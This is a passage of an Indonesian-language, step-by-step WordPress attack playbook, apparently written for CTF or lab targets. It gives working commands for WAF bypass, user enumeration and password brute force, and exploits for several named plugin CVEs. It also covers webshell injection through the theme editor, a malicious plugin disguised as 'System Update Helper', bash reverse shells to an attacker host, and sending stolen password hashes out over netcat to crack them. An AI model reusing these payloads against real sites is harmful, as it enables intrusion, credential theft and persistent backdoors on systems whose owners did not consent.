cat ~/wp_loot/wpscan_results.json | jq -r '.users[].username' 2>/dev/null | tee ~/wp_loot/creds/users.txt
```

**OUTPUT GAGAL ❌ — WPScan diblokir WAF:**

text

```
[!] The target is responding with a 403 for the WPScan user agent.
```

➡️ Bypass WAF:

Bash

```
# Ganti user agent manual
wpscan --url "$TARGET" \
    --random-user-agent \
    --throttle 2000 \
    --enumerate u \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Real-IP: 127.0.0.1"

# Atau route via Burp
wpscan --url "$TARGET" \
    --proxy http://127.0.0.1:8080 \
    --enumerate u
```

**OUTPUT GAGAL ❌ — API token limit:**

text

```
[!] 50 queries remaining (free plan)
```

➡️ Jalankan tanpa `--api-token`, tetap dapat enumerate plugin/user tapi tanpa detail CVE.

---

### Langkah 1.2 — Manual Enumeration (Jalankan Paralel dengan WPScan)

Bash

```
# 1. Enumerate plugins dari HTML DOM
curl -s "$TARGET" | grep -oE 'wp-content/plugins/[^/"]+' | sort -u | cut -d'/' -f3 \
    | tee ~/wp_loot/files/plugins_dom.txt

# 2. Enumerate themes dari HTML DOM
curl -s "$TARGET" | grep -oE 'wp-content/themes/[^/"]+' | sort -u | cut -d'/' -f3 \
    | tee ~/wp_loot/files/themes_dom.txt

# 3. Cek versi tiap plugin yang ditemukan
for plugin in $(cat ~/wp_loot/files/plugins_dom.txt); do
    version=$(curl -s "$TARGET/wp-content/plugins/$plugin/readme.txt" | grep -i "Stable tag:" | awk '{print $NF}')
    echo "[*] Plugin: $plugin | Version: ${version:-Unknown}"
done

# 4. Cek sensitive files (jalankan semua sekaligus)
for file in "wp-config.php.bak" "wp-config.old" "wp-config.php~" ".wp-config.php.swp" \
            "wp-content/debug.log" "readme.html" "license.txt" \
            ".git/config" ".env" "backup.zip" "backup.sql"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file")
    if [ "$status" = "200" ]; then
        echo "[!!!] EXPOSED ($status): $TARGET/$file"
    fi
done
```

**OUTPUT BERHASIL ✅ — Plugin ditemukan:**

text

```
contact-form-7
wp-file-manager
woocommerce
```

➡️ Langsung cari exploit:

Bash

```
for plugin in $(cat ~/wp_loot/files/plugins_dom.txt); do
    echo "=== Searching exploit for: $plugin ==="
    searchsploit "WordPress Plugin $plugin" | head -5
done
```

**OUTPUT BERHASIL ✅ — File sensitif exposed:**

text

```
[!!!] EXPOSED (200): http://10.10.11.200/wp-config.php.bak
```

➡️ **JACKPOT! Download dan ambil credentials:**

Bash

```
curl -s "$TARGET/wp-config.php.bak" | grep -E "DB_USER|DB_PASSWORD|DB_NAME|DB_HOST|AUTH_KEY|LOGGED_IN_KEY"

# Simpan
curl -s "$TARGET/wp-config.php.bak" -o ~/wp_loot/files/wp-config.bak
grep -E "DB_|SECRET|AUTH|SALT|KEY" ~/wp_loot/files/wp-config.bak
```

➡️ Langsung ke **Fase 4C (Database Credentials → Shell)**

---

### Langkah 1.3 — User Enumeration (5 Metode)

Bash

```
# Metode A: REST API (PALING MUDAH jika aktif)
curl -s "$TARGET/wp-json/wp/v2/users" | jq -r '.[].slug' 2>/dev/null

# Metode B: Author archives redirect
for id in {1..10}; do
    result=$(curl -s -I "$TARGET/?author=$id" | grep -i "^Location:" | grep -v "wp-login")
    if [ -n "$result" ]; then
        echo "User ID $id: $result"
    fi
done

# Metode C: oEmbed endpoint
curl -s "$TARGET/wp-json/oembed/1.0/embed?url=$TARGET&format=json" | jq -r '.author_name' 2>/dev/null

# Metode D: Yoast SEO sitemap (jika plugin aktif)
curl -s "$TARGET/author-sitemap.xml" | grep -oP '(?<=<loc>)[^<]+' | head -10

# Metode E: Login error timing (deteksi username valid)
curl -s -X POST "$TARGET/wp-login.php" \
    -d "log=admin&pwd=wrongpassword123&wp-submit=Log+In" \
    | grep -i "invalid username\|The password you entered"
```

**OUTPUT BERHASIL ✅ — REST API kasih username:**

JSON

```
["admin", "editor", "john"]
```

**OUTPUT BERHASIL ✅ — Author redirect:**

text

```
User ID 1: Location: http://10.10.11.200/author/admin/
User ID 2: Location: http://10.10.11.200/author/john/
```

**OUTPUT BERHASIL ✅ — Error login:**

text

```
ERROR: The password you entered for the username admin is incorrect.
```

→ Username `admin` **VALID** (error berisi nama user, bukan "invalid username")

text

```
ERROR: Invalid username.
```

→ Username **TIDAK VALID**

Bash

```
# Simpan semua username yang ditemukan
cat > ~/wp_loot/creds/users.txt << 'EOF'
admin
editor
john
EOF

echo "[*] Total users: $(wc -l < ~/wp_loot/creds/users.txt)"
```

**OUTPUT GAGAL ❌ — REST API diblokir:**

text

```
{"code":"rest_no_route","message":"No route was found matching the URL and request method."}
```

➡️ Fokus ke Metode B dan E. Atau:

Bash

```
# Coba wp-json root untuk lihat apa yang diexpose
curl -s "$TARGET/wp-json/" | jq '.routes | keys[]' | grep -v "wp/v2" | head -20
```

---

### Langkah 1.4 — XML-RPC Check (PENTING!)

Bash

```
# Command 1: Cek apakah XML-RPC aktif
curl -s -X POST "$TARGET/xmlrpc.php" \
    -d "<methodCall><methodName>demo.sayHello</methodName></methodCall>"

# Command 2: List semua methods yang tersedia
curl -s -X POST "$TARGET/xmlrpc.php" \
    -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" \
    | grep -oP '(?<=<string>)[^<]+'
```

**OUTPUT BERHASIL ✅ — XML-RPC aktif:**

XML

```
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params><param><value><string>Hello!</string></value></param></params>
</methodResponse>
```

➡️ **XML-RPC aktif! Ini adalah vektor brute force yang sangat efisien:**

Bash

```
export XMLRPC_ACTIVE="true"
echo "[!] XML-RPC ACTIVE - Dapat digunakan untuk multicall brute force!"
```

➡️ Lanjut ke **Fase 2B — XML-RPC Brute Force**

**OUTPUT GAGAL ❌ — XML-RPC diblokir:**

XML

```
<title>403 Forbidden</title>
```

atau

text

```
curl: (7) Failed to connect
```

➡️ XML-RPC diblokir. Fokus ke brute force via `/wp-login.php` atau REST API auth.

---

## ═══════════════════════════════════════

## FASE 2: AUTHENTICATION — USER & CREDENTIALS

## ═══════════════════════════════════════

> **Tujuan:** Dapatkan credentials valid untuk masuk ke WordPress admin.

### Langkah 2.1 — Cek Default & Common Credentials DULU (Sebelum Brute Force)

Bash

```
# Jangan langsung brute force! Cek yang paling umum dulu
# CTF biasanya pakai credentials sederhana

# Command 1: Test common credentials dengan WPScan
wpscan --url "$TARGET" \
    -U ~/wp_loot/creds/users.txt \
    -P /usr/share/wordlists/fasttrack.txt \
    --password-attack wp-login \
    2>&1 | tee ~/wp_loot/creds/quick_spray.txt

# Command 2: Manual test cepat via curl
for pass in "admin" "password" "123456" "wordpress" "letmein" "admin123" "P@ssw0rd" "Welcome1"; do
    result=$(curl -s -X POST "$TARGET/wp-login.php" \
        -d "log=admin&pwd=$pass&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
        -b "wordpress_test_cookie=WP+Cookie+check" \
        -c /tmp/wp_cookies.txt \
        -w "%{http_code}" -o /dev/null)
    
    if [ "$result" = "302" ]; then
        location=$(curl -s -X POST "$TARGET/wp-login.php" \
            -d "log=admin&pwd=$pass&wp-submit=Log+In" \
            -b "wordpress_test_cookie=WP+Cookie+check" \
            -I | grep "Location" | grep -v "wp-login")
        if [ -n "$location" ]; then
            echo "[!!!] FOUND: admin:$pass"
            export WP_USER="admin"
            export WP_PASS="$pass"
        fi
    fi
done
```

**OUTPUT BERHASIL ✅ — Default creds bekerja:**

text

```
[!!!] FOUND: admin:admin
```

➡️ **Langsung ke Fase 3 (Admin Shell)!**

---

### Langkah 2.2A — Brute Force via XML-RPC Multicall (Jika XMLRPC Aktif)

> XML-RPC multicall = kirim 500 password dalam 1 HTTP request. WAF biasanya tidak detect ini karena hanya 1 request.

Bash

```
# Command 1: WPScan dengan xmlrpc-multicall (PALING CEPAT)
wpscan --url "$TARGET" \
    -U ~/wp_loot/creds/users.txt \
    -P /usr/share/wordlists/rockyou.txt \
    --password-attack xmlrpc-multicall \
    --max-threads 10 \
    2>&1 | tee ~/wp_loot/creds/xmlrpc_brute.txt

# Monitor progress
grep "Valid Combinations Found\|[+]" ~/wp_loot/creds/xmlrpc_brute.txt
```

**OUTPUT BERHASIL ✅ — Password ditemukan:**

text

```
[SUCCESS] - admin / P@ssword123!
[i] Valid Combinations Found:
 | Username: admin, Password: P@ssword123!
```

➡️ **Simpan credentials:**

Bash

```
export WP_USER="admin"
export WP_PASS="P@ssword123!"
echo "$WP_USER:$WP_PASS" >> ~/wp_loot/creds/found_creds.txt
echo "[*] CREDS FOUND - Lanjut ke Fase 3!"
```

**OUTPUT GAGAL ❌ — Multicall diblokir (faultCode 405):**

XML

```
<faultCode><int>405</int></faultCode>
<faultString><string>XML-RPC services are disabled on this site.</string></faultString>
```

➡️ Switch ke brute force via wp-login.php:

---

### Langkah 2.2B — Brute Force via wp-login.php

Bash

```
# Command 1: WPScan wp-login attack (lebih lambat tapi reliable)
wpscan --url "$TARGET" \
    -U ~/wp_loot/creds/users.txt \
    -P /usr/share/wordlists/rockyou.txt \
    --password-attack wp-login \
    --throttle 500 \
    2>&1 | tee ~/wp_loot/creds/wplogin_brute.txt

# Command 2: Hydra (alternatif)
# Cek dulu apa error message saat login gagal
fail_msg=$(curl -s -X POST "$TARGET/wp-login.php" \
    -d "log=invaliduser123&pwd=invalidpass&wp-submit=Log+In" | \
    grep -oP '(?<=<div id="login_error">)[^<]+')
echo "Fail string: $fail_msg"

hydra -L ~/wp_loot/creds/users.txt \
    -P /usr/share/wordlists/rockyou.txt \
    "$TARGET_IP" http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:$fail_msg" \
    -t 10 -V 2>&1 | tee ~/wp_loot/creds/hydra_results.txt
```

**OUTPUT BERHASIL ✅:**

text

```
[80][http-post-form] host: 10.10.11.200   login: admin   password: password123
```

**OUTPUT GAGAL ❌ — CAPTCHA atau lockout aktif:**

text

```
[!] Too many attempts. Please try again in 30 minutes.
```

➡️ Stop! Tunggu dan gunakan strategi berbeda:

Bash

```
# Cek apakah ada plugin lockdown
curl -s "$TARGET/wp-login.php" | grep -i "lockdown\|captcha\|blocked\|locked"

# Pivot ke XML-RPC multicall yang sering bypass lockdown plugin
# Atau fokus ke vulnerability scan (Fase 4) dulu
```

---

## ═══════════════════════════════════════

## FASE 3: PLUGIN & THEME VULNERABILITY EXPLOITATION

## ═══════════════════════════════════════

> **Tujuan:** Exploit plugin/tema vulnerable untuk dapat shell TANPA perlu login.

### Langkah 3.1 — Identifikasi Plugin & Cari CVE

Bash

```
# Step 1: Kumpulkan semua plugin yang terdeteksi
cat ~/wp_loot/files/plugins_dom.txt
cat ~/wp_loot/wpscan_output.txt | grep -A5 "\[+\] Plugin"

# Step 2: Untuk setiap plugin, cek versi dan cari exploit
for plugin in $(cat ~/wp_loot/files/plugins_dom.txt 2>/dev/null); do
    echo "=== $plugin ==="
    # Cek readme untuk versi
    curl -s "$TARGET/wp-content/plugins/$plugin/readme.txt" | grep -i "stable tag\|version" | head -3
    # Cari di searchsploit
    searchsploit "wordpress $plugin" 2>/dev/null | head -5
    echo ""
done
```

**OUTPUT BERHASIL ✅ — Plugin vulnerable ditemukan:**

text

```
=== wp-file-manager ===
Stable tag: 6.4
WordPress Plugin WP File Manager 6.0-6.8 - Unauthenticated Arbitrary File Upload  | php/webapps/49178.py
```

➡️ **Langsung ke exploit spesifik berdasarkan plugin!**

---

### Langkah 3.2 — Exploit WP File Manager <= 6.8 (CVE-2020-25213) — Pre-Auth RCE

> **Kapan digunakan:** Plugin WP File Manager versi 6.0-6.8 terdeteksi.

Bash

```
# Step 1: Konfirmasi versi vulnerable
curl -s "$TARGET/wp-content/plugins/wp-file-manager/readme.txt" | grep -i "stable tag"
```

**OUTPUT BERHASIL ✅:**

text

```
Stable tag: 6.4
```

(Versi 6.0 - 6.8 = VULNERABLE)

Bash

```
# Step 2: Buat payload
cat > /tmp/shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])){
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
?>
EOF

# Step 3A: Exploit otomatis via searchsploit
searchsploit -m 49178
python3 49178.py "$TARGET"

# Step 3B: Manual via curl multipart
curl -ks -X POST \
    -F "reqid=17457a1b06f" \
    -F "cmd=upload" \
    -F "target=l1_Lw" \
    -F "upload[]=@/tmp/shell.php" \
    "$TARGET/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
```

**OUTPUT BERHASIL ✅ — Upload berhasil:**

JSON

```
{
  "added": [{
    "name": "shell.php",
    "path": "l1_L3RtcA/shell.php"
  }]
}
```

Bash

```
# Step 4: Cari lokasi file yang diupload
# Biasanya di: /wp-content/plugins/wp-file-manager/lib/files/
curl -s "$TARGET/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
```

**OUTPUT BERHASIL ✅ — RCE:**

text

```
www-data
```

Bash

```
# Step 5: Setup listener
nc -lvnp $LPORT &

# Step 6: Trigger reverse shell
curl -s "$TARGET/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
```

**OUTPUT BERHASIL ✅ — Reverse shell masuk:**

text

```
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 49832
bash: no job control in this shell
www-data@target:/var/www/html/wp-content/plugins/wp-file-manager/lib/files$
```

➡️ **Langsung ke Fase 5 (Post-Exploitation)!**

**OUTPUT GAGAL ❌ — 403 Forbidden pada connector:**

text

```
403 Forbidden
```

➡️ Path connector berbeda atau plugin sudah di-patch. Coba:

Bash

```
# Cek path alternatif
curl -s "$TARGET/wp-content/plugins/wp-file-manager/lib/php/" 
# Atau update exploit path
find / -name "connector*.php" 2>/dev/null
```

---

### Langkah 3.3 — Exploit Contact Form 7 < 5.3.2 (CVE-2020-35489) — File Upload

Bash

```
# Step 1: Konfirmasi versi
curl -s "$TARGET/wp-content/plugins/contact-form-7/readme.txt" | grep "Stable tag"

# Step 2: Cari form ID dari halaman yang ada Contact Form
curl -s "$TARGET" | grep -oP 'id="wpcf7-f\K[0-9]+'
# Atau cek semua halaman untuk form
curl -s "$TARGET/contact" | grep "wpcf7"

# Step 3: Upload shell via Contact Form
# KRITIS: Nama file harus mengandung double extension seperti shell.php.
curl -s -X POST \
    "$TARGET/wp-json/contact-form-7/v1/contact-forms/FORM_ID/feedback" \
    -F "your-name=test" \
    -F "your-email=test@test.com" \
    -F "your-subject=test" \
    -F "your-message=test" \
    -F "your-file=@/tmp/shell.php;filename=shell.php."
```

**OUTPUT BERHASIL ✅:**

JSON

```
{
  "status": "mail_sent",
  "message": "Thank you for your message."
}
```

Bash

```
# Cari file yang diupload
# Biasanya di: /wp-content/uploads/YEAR/MONTH/
curl -s "$TARGET/wp-content/uploads/" 
# Atau brute force dengan feroxbuster
feroxbuster -u "$TARGET/wp-content/uploads/" -w /usr/share/wordlists/dirb/common.txt -x php
```

---

### Langkah 3.4 — Exploit WP Automatic < 3.92.0 (CVE-2024-27956) — SQL Injection Unauth

Bash

```
# Step 1: Konfirmasi plugin ada
curl -s "$TARGET/wp-content/plugins/wp-automatic/readme.txt" | grep "Stable tag"

# Step 2: Exploit — Update password admin via SQL Injection
curl -s -X POST \
    "$TARGET/wp-content/plugins/wp-automatic/inc/csv.php" \
    -d "q=UPDATE wp_users SET user_pass=MD5('hacked123') WHERE ID=1"
```

**OUTPUT BERHASIL ✅:**

text

```
(tidak ada output / empty response = berhasil)
```

Bash

```
# Step 3: Login dengan password baru
curl -s -c ~/wp_loot/creds/cookies.txt \
    -X POST "$TARGET/wp-login.php" \
    -d "log=admin&pwd=hacked123&wp-submit=Log+In" \
    -I | grep "Location"
```

**OUTPUT BERHASIL ✅:**

text

```
Location: http://10.10.11.200/wp-admin/
```

➡️ Login berhasil! Ke **Fase 4 (Admin → Shell)**

---

### Langkah 3.5 — Exploit Ultimate Member < 2.6.7 (CVE-2023-3460) — Privilege Escalation Unauth

Bash

```
# Step 1: Konfirmasi plugin
curl -s "$TARGET/wp-content/plugins/ultimate-member/readme.txt" | grep "Stable tag"

# Step 2: Daftar akun baru dengan role administrator
curl -s -X POST "$TARGET/wp-admin/admin-ajax.php" \
    -d "action=um_registration" \
    -d "nonce=$(curl -s $TARGET/register/ | grep -oP 'nonce":"[^"]+' | cut -d'"' -f3)" \
    -d "user_login=hacker_admin" \
    -d "user_password=P@ss1234!" \
    -d "confirm_user_password=P@ss1234!" \
    -d "user_email=hacker@local.com" \
    -d "wp_capabilities[administrator]=1"
```

**OUTPUT BERHASIL ✅:**

JSON

```
{"success":true}
```

Bash

```
# Login dengan akun baru
export WP_USER="hacker_admin"
export WP_PASS="P@ss1234!"
```

➡️ Ke **Fase 4 (Admin → Shell)**

---

## ═══════════════════════════════════════

## FASE 4: ADMIN → SHELL (3 METODE)

## ═══════════════════════════════════════

> **Masuk sini jika sudah punya admin credentials valid dari Fase 2 atau Fase 3.**

### Langkah 4.1 — Login dan Simpan Session Cookie

Bash

```
# Login dan simpan cookie session
curl -s \
    -c ~/wp_loot/creds/admin_cookies.txt \
    -b "wordpress_test_cookie=WP+Cookie+check" \
    -X POST "$TARGET/wp-login.php" \
    -d "log=$WP_USER&pwd=$WP_PASS&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
    -w "\nHTTP Status: %{http_code}" \
    -o /dev/null

# Verifikasi login berhasil
curl -s -b ~/wp_loot/creds/admin_cookies.txt "$TARGET/wp-admin/" \
    -o /dev/null -w "%{http_code}"
```

**OUTPUT BERHASIL ✅ — Login berhasil:**

text

```
HTTP Status: 302
200
```

**OUTPUT GAGAL ❌ — Redirect ke wp-login lagi:**

text

```
HTTP Status: 302
302
```

➡️ Password salah atau cookie tidak tersimpan. Cek:

Bash

```
# Cek apakah password mengandung karakter spesial yang perlu di-encode
WP_PASS_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$WP_PASS'))")
curl -s -c ~/wp_loot/creds/admin_cookies.txt \
    -b "wordpress_test_cookie=WP+Cookie+check" \
    -X POST "$TARGET/wp-login.php" \
    -d "log=$WP_USER&pwd=$WP_PASS_ENC&wp-submit=Log+In&testcookie=1"
```

---

### Langkah 4.2 — Metode A: Theme Editor → 404.php Injection (PALING CEPAT)

Bash

```
# Step 1: Deteksi tema aktif
ACTIVE_THEME=$(curl -s -b ~/wp_loot/creds/admin_cookies.txt "$TARGET/wp-admin/" \
    | grep -oP '(?<=themes/)[^/"]+' | sort -u | head -1)
echo "[*] Active theme: $ACTIVE_THEME"

# Fallback: cek dari homepage
if [ -z "$ACTIVE_THEME" ]; then
    ACTIVE_THEME=$(curl -s "$TARGET" | grep -oP 'wp-content/themes/\K[^/"]+' | sort -u | head -1)
fi

export ACTIVE_THEME="${ACTIVE_THEME:-twentytwenty}"
echo "[*] Using theme: $ACTIVE_THEME"

# Step 2: Cek apakah Theme Editor aktif
EDITOR_CHECK=$(curl -s -b ~/wp_loot/creds/admin_cookies.txt \
    "$TARGET/wp-admin/theme-editor.php" | grep -i "DISALLOW_FILE_EDIT\|not allowed")
echo "Editor check: $EDITOR_CHECK"
```

**OUTPUT BERHASIL ✅ — Theme editor accessible:**

text

```
(tidak ada pesan error, halaman editor tampil)
```

Bash

```
# Step 3: Ambil nonce (WAJIB!)
NONCE=$(curl -s -b ~/wp_loot/creds/admin_cookies.txt \
    "$TARGET/wp-admin/theme-editor.php?file=404.php&theme=$ACTIVE_THEME" \
    | grep -oP 'id="_wpnonce"\s+value="\K[a-f0-9]+' | head -1)

# Fallback regex
if [ -z "$NONCE" ]; then
    NONCE=$(curl -s -b ~/wp_loot/creds/admin_cookies.txt \
        "$TARGET/wp-admin/theme-editor.php?file=404.php&theme=$ACTIVE_THEME" \
        | grep -oP 'name="_wpnonce" value="\K[a-f0-9]+' | head -1)
fi

echo "[*] Nonce: $NONCE"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Nonce: d4a8bc12e9
```

**OUTPUT GAGAL ❌ — Nonce kosong:**

text

```
[*] Nonce: 
```

➡️ Cookie tidak valid atau tema tidak punya 404.php. Coba:

Bash

```
# Coba file lain selain 404.php
NONCE=$(curl -s -b ~/wp_loot/creds/admin_cookies.txt \
    "$TARGET/wp-admin/theme-editor.php?file=index.php&theme=$ACTIVE_THEME" \
    | grep -oP 'name="_wpnonce" value="\K[a-f0-9]+' | head -1)

# Atau lihat file apa yang ada di tema ini
curl -s -b ~/wp_loot/creds/admin_cookies.txt \
    "$TARGET/wp-admin/theme-editor.php?theme=$ACTIVE_THEME" \
    | grep -oP 'file=[^"]+\.php' | sort -u | head -20
```

Bash

```
# Step 4: Inject webshell ke 404.php
curl -s -b ~/wp_loot/creds/admin_cookies.txt \
    -X POST "$TARGET/wp-admin/theme-editor.php" \
    -d "action=update" \
    -d "file=404.php" \
    -d "theme=$ACTIVE_THEME" \
    -d "newcontent=<?php if(isset(\$_GET['cmd'])){system(\$_GET['cmd']);} ?>" \
    -d "_wpnonce=$NONCE" \
    -d "submit=Update+File"

# Step 5: Test webshell
curl -s "$TARGET/wp-content/themes/$ACTIVE_THEME/404.php?cmd=id"
```

**OUTPUT BERHASIL ✅ — Webshell bekerja:**

text

```
www-data
```

Bash

```
# Step 6: Setup listener dan trigger reverse shell
nc -lvnp $LPORT &
sleep 1

# URL-encoded bash reverse shell
curl -s "$TARGET/wp-content/themes/$ACTIVE_THEME/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
```

**OUTPUT BERHASIL ✅ — Reverse shell:**

text

```
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 49833
bash: no job control in this shell
www-data@wordpress:/var/www/html/wp-content/themes/twentytwenty$
```

➡️ **SHELL! Ke Fase 5 (Post-Exploitation)**

**OUTPUT GAGAL ❌ — Theme editor disabled:**

text

```
You are not allowed to edit templates for this site.
```

atau

text

```
File editing is disabled.
```

➡️ `DISALLOW_FILE_EDIT = true` di wp-config.php. Gunakan **Metode B**.

---

### Langkah 4.3 — Metode B: Malicious Plugin Upload

Bash

```
# Step 1: Buat struktur plugin
mkdir -p /tmp/evil_plugin

cat > /tmp/evil_plugin/evil.php << 'EOF'
<?php
/**
 * Plugin Name: System Update Helper
 * Plugin URI: https://wordpress.org
 * Description: System maintenance plugin
 * Version: 1.0.0
 * Author: Admin
 */
if (isset($_REQUEST['cmd'])) {
    system($_REQUEST['cmd']);
}
EOF

# Step 2: Buat zip
cd /tmp && zip -r evil_plugin.zip evil_plugin/
ls -la /tmp/evil_plugin.zip

# Step 3: Ambil nonce untuk upload plugin
UPLOAD_NONCE=$(curl -s -b ~/wp_loot/creds/admin_cookies.txt \
    "$TARGET/wp-admin/plugin-install.php" \
    | grep -oP '_wpnonce=\K[a-f0-9]+' | head -1)

# Step 4: Upload plugin
curl -s -b ~/wp_loot/creds/admin_cookies.txt \
    -X POST "$TARGET/wp-admin/update.php?action=upload-plugin" \
    -F "_wpnonce=$UPLOAD_NONCE" \
    -F "pluginzip=@/tmp/evil_plugin.zip"
```

**OUTPUT BERHASIL ✅ — Plugin uploaded:**

HTML

```
Plugin installed successfully.
```

Bash

```
# Step 5: Activate plugin
ACTIVATE_NONCE=$(curl -s -b ~/wp_loot/creds/admin_cookies.txt \
    "$TARGET/wp-admin/plugins.php" \
    | grep -oP '"activate&amp;plugin=evil_plugin%2Fevil.php&amp;plugin_status=all&amp;paged=1&amp;s&amp;_wpnonce=\K[a-f0-9]+' | head -1)

curl -s -b ~/wp_loot/creds/admin_cookies.txt \
    "$TARGET/wp-admin/plugins.php?action=activate&plugin=evil_plugin%2Fevil.php&_wpnonce=$ACTIVATE_NONCE"

# Step 6: Test dan trigger reverse shell
curl -s "$TARGET/wp-content/plugins/evil_plugin/evil.php?cmd=id"
nc -lvnp $LPORT &
curl -s "$TARGET/wp-content/plugins/evil_plugin/evil.php" \
    --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
```

**OUTPUT GAGAL ❌ — Upload gagal (file size):**

text

```
The uploaded file exceeds the upload_max_filesize directive in php.ini
```

➡️ Buat plugin yang lebih kecil:

Bash

```
# Minimal plugin (sangat kecil)
cat > /tmp/mini_evil.php << 'EOF'
<?php /* Plugin Name: Helper */ if(isset($_GET['c'])){system($_GET['c']);}
EOF
mkdir /tmp/mini_plugin
cp /tmp/mini_evil.php /tmp/mini_plugin/
cd /tmp && zip mini_plugin.zip mini_plugin/mini_evil.php
```

---

### Langkah 4.4 — Metode C: Database Credentials → Admin Override

> Gunakan jika dapat `wp-config.php` via LFI/backup file

Bash

```
# Dari wp-config.php yang sudah didapat
DB_USER="wp_admin"
DB_PASS="P@ssw0rd123!"
DB_NAME="wordpress_db"
DB_HOST="localhost"

# Connect ke MySQL (jika port 3306 terbuka)
mysql -h $TARGET_IP -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" << 'EOF'
-- Lihat semua user dan hash
SELECT ID, user_login, user_pass, user_email FROM wp_users;

-- Timpa password admin dengan password baru: "HackedPass123!"
-- Hash phpass untuk "HackedPass123!" yang bisa digenerate:
UPDATE wp_users SET user_pass = '$P$BIRXVCanoe8x75N2m6yvDOoSj5kFX.' WHERE ID = 1;

-- Atau pakai MD5 (lebih simple, WordPress menerima ini)
UPDATE wp_users SET user_pass = MD5('HackedPass123!') WHERE ID = 1;

-- Verifikasi
SELECT user_login, user_pass FROM wp_users WHERE ID = 1;
EOF
```

**OUTPUT BERHASIL ✅:**

text

```
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | 827ccb0eea8a706c4c34a16891f84e7b |
+------------+------------------------------------+
```

Bash

```
# Login dengan password baru
export WP_USER="admin"
export WP_PASS="HackedPass123!"

curl -s -c ~/wp_loot/creds/admin_cookies.txt \
    -b "wordpress_test_cookie=WP+Cookie+check" \
    -X POST "$TARGET/wp-login.php" \
    -d "log=$WP_USER&pwd=$WP_PASS&wp-submit=Log+In&testcookie=1" \
    -w "Status: %{http_code}" -o /dev/null
```

**OUTPUT GAGAL ❌ — MySQL port tidak accessible:**

text

```
ERROR 2003 (HY000): Can't connect to MySQL server
```

➡️ MySQL hanya accessible dari localhost. Butuh shell dulu untuk akses, atau:

Bash

```
# Cek apakah ada phpMyAdmin atau Adminer
for path in "phpmyadmin" "phpMyAdmin" "pma" "adminer" "adminer.php" "db" "database"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$path")
    echo "[$status] $TARGET/$path"
done
```

---

## ═══════════════════════════════════════

## FASE 5: POST-EXPLOITATION

## ═══════════════════════════════════════

> **Masuk sini setelah dapat shell (www-data atau lebih tinggi)**

### Langkah 5.1 — Upgrade Shell ke TTY Interaktif

Bash

```
# Di shell yang masuk:
# Step 1: Upgrade ke PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Atau
python -c 'import pty; pty.spawn("/bin/bash")'
# Atau
script /dev/null -c bash

# Step 2: Tekan Ctrl+Z untuk suspend

# Step 3: Di mesin Parrot OS
stty raw -echo; fg

# Step 4: Di dalam shell target (setelah fg)
reset
export TERM=xterm-256color
stty rows 40 columns 160
export SHELL=/bin/bash
```

**OUTPUT BERHASIL ✅ — TTY interaktif:**

text

```
www-data@wordpress:/var/www/html$ 
```

(Shell interaktif dengan tab completion dan Ctrl+C berfungsi)

---

### Langkah 5.2 — Kumpulkan Credentials dari WordPress

Bash

```
# Step 1: Baca wp-config.php (TARGET UTAMA)
cat /var/www/html/wp-config.php | grep -E "DB_USER|DB_PASSWORD|DB_NAME|DB_HOST|AUTH_KEY|LOGGED_IN_KEY"

# Step 2: Dump database
DB_USER=$(grep "DB_USER" /var/www/html/wp-config.php | cut -d"'" -f4)
DB_PASS=$(grep "DB_PASSWORD" /var/www/html/wp-config.php | cut -d"'" -f4)
DB_NAME=$(grep "DB_NAME" /var/www/html/wp-config.php | cut -d"'" -f4)

echo "[*] DB: $DB_USER / $DB_PASS @ $DB_NAME"

# Dump user hashes
mysql -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" -e "SELECT user_login, user_pass, user_email FROM wp_users;"

# Step 3: Simpan hash untuk crack
mysql -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" -e "SELECT user_login, user_pass FROM wp_users;" | tail -n +2 | awk '{print $1":"$2}' > /tmp/wp_hashes.txt
cat /tmp/wp_hashes.txt
```

**OUTPUT BERHASIL ✅:**

text

```
user_login   user_pass
admin        $P$B91/K729E4y5eN8/70fE4X4e0.w4.z0
john         $P$BKkb7.kS2TQJV8y4eT5.1D4K0TQs.c.
```

Bash

```
# Download hash ke mesin Parrot OS
# Di mesin Parrot, dari direktori lain:
nc -lvnp 9001 > ~/wp_loot/hashes/wp_hashes.txt

# Di target:
cat /tmp/wp_hashes.txt | nc $LHOST 9001
```

**Crack hash di Parrot OS:**

Bash

```
# Format untuk hashcat: username:hash
cat ~/wp_loot/hashes/wp_hashes.txt

# Crack dengan hashcat mode 400 (phpass = WordPress)
hashcat -m 400 -a 0 ~/wp_loot/hashes/wp_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    --force \
    -o ~/wp_loot/hashes/cracked.txt

# Dengan rules jika rockyou gagal
hashcat -m 400 -a 0 ~/wp_loot/hashes/wp_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force

# Dengan John
john --format=phpass ~/wp_loot/hashes/wp_hashes.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt

john --format=phpass ~/wp_loot/hashes/wp_hashes.txt --show
```

**OUTPUT BERHASIL ✅ — Hash tercrack:**

text

```
